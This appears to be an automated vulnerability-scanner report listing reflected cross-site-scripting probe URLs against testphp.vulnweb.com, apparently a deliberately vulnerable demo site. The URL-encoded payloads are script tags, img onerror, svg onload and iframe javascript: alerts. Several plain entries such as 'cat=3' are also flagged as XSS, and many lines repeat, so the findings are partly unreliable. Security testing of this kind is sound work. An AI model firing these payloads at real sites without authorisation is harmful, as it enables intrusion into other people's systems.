=== Vulnyx Scan Report ===
Timestamp: 20250426_015038
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=%27%3E%3Csvg%2Fonload%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E%2F%2F
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=3
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=3
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=3
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%2Fonload%3Dalert%281%29%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=%27%3E%3Csvg%2Fonload%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E%2F%2F
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=2
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=2
[XSS] http://testphp.vulnweb.com/listproducts.php?cat=2
[XSS] http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/artists.php?artist=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
[XSS] http://testphp.vulnweb.com/artists.php?artist=%3Csvg%2Fonload%3Dalert%281%29%3E
[XSS] http://testphp.vulnweb.com/artists.php?artist=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E
[XSS] http://testphp.vulnweb.com/artists.php?artist=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E
[XSS] http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/artists.php?artist=%27%3E%3Csvg%2Fonload%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E%2F%2F
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Csvg%2Fonload%3Dalert%281%29%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=%27%3E%3Csvg%2Fonload%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E%2F%2F
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=1
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=1
[XSS] http://testphp.vulnweb.com/listproducts.php?artist=1
[XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/showimage.php?file=%27%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
[XSS] http://testphp.vulnweb.com/showimage.php?file=%3Csvg%2Fonload%3Dalert%281%29%3E
[XSS] http://testphp.vulnweb.com/showimage.php?file=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E
[XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E
[XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/showimage.php?file=%27%3E%3Csvg%2Fonload%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E%2F%2F
[XSS] http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/product.php?pic=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
[XSS] http://testphp.vulnweb.com/product.php?pic=%3Csvg%2Fonload%3Dalert%281%29%3E
[XSS] http://testphp.vulnweb.com/product.php?pic=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E
[XSS] http://testphp.vulnweb.com/product.php?pic=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E
[XSS] http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Econfirm%281%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/product.php?pic=%27%3E%3Csvg%2Fonload%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E%2F%2F
[XSS] http://testphp.vulnweb.com/product.php?pic=6
[XSS] http://testphp.vulnweb.com/product.php?pic=6
[XSS] http://testphp.vulnweb.com/product.php?pic=6
[XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/showimage.php?file=%27%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
[XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
[XSS] http://testphp.vulnweb.com/showimage.php?file=%3Csvg%2Fonload%3Dalert%281%29%3E
